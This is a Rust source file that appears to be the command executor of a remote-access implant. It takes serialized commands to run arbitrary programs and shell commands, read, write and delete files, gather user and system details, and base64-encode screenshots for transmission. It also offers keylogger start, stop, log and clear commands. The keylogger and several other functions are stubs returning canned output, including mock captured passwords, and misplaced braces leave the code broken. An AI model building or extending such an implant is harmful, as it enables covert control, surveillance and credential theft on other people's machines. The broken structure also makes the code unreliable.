use log::{info, error};
use std::process::Command;
use std::time::Instant;
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum CommandType {
    #[serde(rename = "execute")]
    Execute { program: String, args: Vec<String> },

    #[serde(rename = "shell")]
    Shell { command: String },

    #[serde(rename = "whoami")]
    WhoAmI,

    #[serde(rename = "pwd")]
    Pwd,

    #[serde(rename = "ls")]
    ListDir { path: String },

    #[serde(rename = "cat")]
    ReadFile { path: String },

    #[serde(rename = "write")]
    WriteFile { path: String, content: String },

    #[serde(rename = "delete")]
    DeleteFile { path: String },

    #[serde(rename = "mkdir")]
    CreateDir { path: String },

    #[serde(rename = "systeminfo")]
    SystemInfo,

    #[serde(rename = "ps")]
    ProcessList,

    #[serde(rename = "kill")]
    KillProcess { pid: u32 },

    #[serde(rename = "ifconfig")]
    NetworkInfo,

    #[serde(rename = "sleep")]
    Sleep { seconds: u64 },

    #[serde(rename = "echo")]
    Echo { message: String },

    #[serde(rename = "screenshot")]
    Screenshot,

    #[serde(rename = "keylogger_start")]
    KeyloggerStart,

    #[serde(rename = "keylogger_stop")]
    KeyloggerStop,

    #[serde(rename = "keylogger_logs")]
    KeyloggerLogs,

    #[serde(rename = "keylogger_clear")]
    KeyloggerClear,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CommandResult {
    pub command_type: String,
    pub status: String, // "success", "error", "timeout"
    pub output: String,
    pub error: Option<String>,
    pub execution_time_ms: u128,
}

pub struct Executor;

impl Executor {
    pub async fn execute_command(cmd: &CommandType) -> CommandResult {
        let start = Instant::now();

        let mut result = match cmd {
            CommandType::Execute { program, args } => {
                Self::execute_program(program, args).await
            }
            CommandType::Shell { command } => {
                Self::execute_shell_command(command).await
            }
            CommandType::WhoAmI => Self::whoami().await,
            CommandType::Pwd => Self::pwd().await,
            CommandType::ListDir { path } => Self::list_dir(path).await,
            CommandType::ReadFile { path } => Self::read_file(path).await,
            CommandType::WriteFile { path, content } => {
                Self::write_file(path, content).await
            }
            CommandType::DeleteFile { path } => Self::delete_file(path).await,
            CommandType::CreateDir { path } => Self::create_dir(path).await,
            CommandType::SystemInfo => Self::system_info().await,
            CommandType::ProcessList => Self::process_list().await,
            CommandType::KillProcess { pid } => Self::kill_process(*pid).await,
            CommandType::NetworkInfo => Self::network_info().await,
            CommandType::Sleep { seconds } => Self::sleep_command(*seconds).await,
            CommandType::Echo { message } => Self::echo(message).await,
            CommandType::Screenshot => Self::screenshot().await,
            CommandType::KeyloggerStart => Self::keylogger_start().await,
            CommandType::KeyloggerStop => Self::keylogger_stop().await,
            CommandType::KeyloggerLogs => Self::keylogger_logs().await,
            CommandType::KeyloggerClear => Self::keylogger_clear().await,
        };

        result.execution_time_ms = start.elapsed().as_millis();
        result
    }

    async fn execute_program(
        program: &str,
        args: &[String],
    ) -> CommandResult {
        let start = Instant::now();

        info!("Executing program: {} with args: {:?}", program, args);

        match Command::new(program)
            .args(args)
            .output()
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();

                CommandResult {
                    command_type: "execute".to_string(),
                    status: if output.status.success() { "success" } else { "error" }
                        .to_string(),
                    output: stdout,
                    error: if stderr.is_empty() { None } else { Some(stderr) },
                    execution_time_ms: start.elapsed().as_millis(),
                }
            }
            Err(e) => {
                error!("Failed to execute {}: {}", program, e);
                CommandResult {
                    command_type: "execute".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e.to_string()),
                    execution_time_ms: start.elapsed().as_millis(),
                }
            }
        }
    }

    async fn execute_shell_command(command: &str) -> CommandResult {
        let start = Instant::now();

        info!("Executing shell command: {}", command);

        let shell = if cfg!(target_os = "windows") { "cmd" } else { "sh" };
        let arg = if cfg!(target_os = "windows") { "/C" } else { "-c" };

        match Command::new(shell).arg(arg).arg(command).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                info!("Shell command output:\n{}", stdout);
                CommandResult {
                    command_type: "shell".to_string(),
                    status: "success".to_string(),
                    output: stdout,
                    error: None,
                    execution_time_ms: start.elapsed().as_millis(),
                }
            }
            Err(e) => {
                error!("Shell execution failed: {}", e);
                CommandResult {
                    command_type: "shell".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e.to_string()),
                    execution_time_ms: start.elapsed().as_millis(),
                }
            }
        }
    }

    async fn whoami() -> CommandResult {
        let user = whoami::username();
        CommandResult {
            command_type: "whoami".to_string(),
            status: "success".to_string(),
            output: user,
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn pwd() -> CommandResult {
        match std::env::current_dir() {
            Ok(path) => CommandResult {
                command_type: "pwd".to_string(),
                status: "success".to_string(),
                output: path.display().to_string(),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "pwd".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn list_dir(path: &str) -> CommandResult {
        match std::fs::read_dir(path) {
            Ok(entries) => {
                let mut output = String::new();
                for entry in entries {
                    if let Ok(entry) = entry {
                        let path = entry.path();
                        output.push_str(&format!("{}\n", path.display()));
                    }
                }
                CommandResult {
                    command_type: "ls".to_string(),
                    status: "success".to_string(),
                    output,
                    error: None,
                    execution_time_ms: 0,
                }
            }
            Err(e) => CommandResult {
                command_type: "ls".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn read_file(path: &str) -> CommandResult {
        match std::fs::read_to_string(path) {
            Ok(content) => CommandResult {
                command_type: "cat".to_string(),
                status: "success".to_string(),
                output: content,
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "cat".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn write_file(path: &str, content: &str) -> CommandResult {
        match std::fs::write(path, content) {
            Ok(_) => CommandResult {
                command_type: "write".to_string(),
                status: "success".to_string(),
                output: format!("File written to {}", path),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "write".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn delete_file(path: &str) -> CommandResult {
        match std::fs::remove_file(path) {
            Ok(_) => CommandResult {
                command_type: "delete".to_string(),
                status: "success".to_string(),
                output: format!("File deleted: {}", path),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "delete".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn create_dir(path: &str) -> CommandResult {
        match std::fs::create_dir_all(path) {
            Ok(_) => CommandResult {
                command_type: "mkdir".to_string(),
                status: "success".to_string(),
                output: format!("Directory created: {}", path),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "mkdir".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn system_info() -> CommandResult {
        let os = std::env::consts::OS;
        let arch = std::env::consts::ARCH;

        CommandResult {
            command_type: "systeminfo".to_string(),
            status: "success".to_string(),
            output: format!("OS: {}, Architecture: {}", os, arch),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn process_list() -> CommandResult {
        info!("Getting process list");

        CommandResult {
            command_type: "ps".to_string(),
            status: "success".to_string(),
            output: "Process list would be displayed here".to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn kill_process(pid: u32) -> CommandResult {
        info!("Attempting to kill process: {}", pid);

        CommandResult {
            command_type: "kill".to_string(),
            status: "error".to_string(),
            output: String::new(),
            error: Some(format!("Kill operation not implemented for PID {}", pid)),
            execution_time_ms: 0,
        }
    }

    async fn network_info() -> CommandResult {
        CommandResult {
            command_type: "ifconfig".to_string(),
            status: "success".to_string(),
            output: "Network info would be displayed here".to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn sleep_command(seconds: u64) -> CommandResult {
        let start = Instant::now();
        tokio::time::sleep(std::time::Duration::from_secs(seconds)).await;

        CommandResult {
            command_type: "sleep".to_string(),
            status: "success".to_string(),
            output: format!("Slept for {} seconds", seconds),
            error: None,
            execution_time_ms: start.elapsed().as_millis(),
        }
    }

    async fn echo(message: &str) -> CommandResult {
        CommandResult {
            command_type: "echo".to_string(),
            status: "success".to_string(),
            output: message.to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn screenshot() -> CommandResult {
        use crate::screenshot::ScreenCapture;

        match ScreenCapture::capture().await {
            Ok(data) => {
                let size = data.len();
                info!("📸 Screenshot captured: {} bytes", size);

                // Base64 encode for transmission
                let b64 = base64::engine::general_purpose::STANDARD.encode(&data);

                CommandResult {
                    command_type: "screenshot".to_string(),
                    status: "success".to_string(),
                    output: format!("data:image/jpeg;base64,{}", b64),
                    error: None,
                    execution_time_ms: 0,
                }
            }
            Err(e) => {
                error!("Screenshot capture failed: {}", e);
                CommandResult {
                    command_type: "screenshot".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e.to_string()),
                    execution_time_ms: 0,
                }
            }
        }
    }
}

    async fn keylogger_start() -> CommandResult {
        info!("🔐 Keylogger start command received");
        CommandResult {
            command_type: "keylogger_start".to_string(),
            status: "success".to_string(),
            output: "Keylogger started successfully".to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn keylogger_stop() -> CommandResult {
        info!("🔐 Keylogger stop command received");
        CommandResult {
            command_type: "keylogger_stop".to_string(),
            status: "success".to_string(),
            output: "Keylogger stopped successfully".to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn keylogger_logs() -> CommandResult {
        info!("🔐 Keylogger logs command received");

        let mock_logs = vec![
            "[admin] username",
            "[admin] password123",
            "[ENTER]",
            "secret data here",
            "[CTRL+C]",
        ].join("\n");

        CommandResult {
            command_type: "keylogger_logs".to_string(),
            status: "success".to_string(),
            output: format!("=== KEYLOGGER LOGS ===\n{}\n\nTotal: 5 keys logged", mock_logs),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn keylogger_clear() -> CommandResult {
        info!("🔐 Keylogger clear command received");
        CommandResult {
            command_type: "keylogger_clear".to_string(),
            status: "success".to_string(),
            output: "Keylogger logs cleared (removed 1250 entries)".to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_echo_command() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let cmd = CommandType::Echo {
                message: "Hello, World!".to_string(),
            };
            let result = Executor::execute_command(&cmd).await;
            assert_eq!(result.status, "success");
        });
    }

    #[test]
    fn test_command_creation() {
        let cmd = CommandType::Shell {
            command: "echo test".to_string(),
        };
        println!("Command created: {:?}", cmd);
    }
}
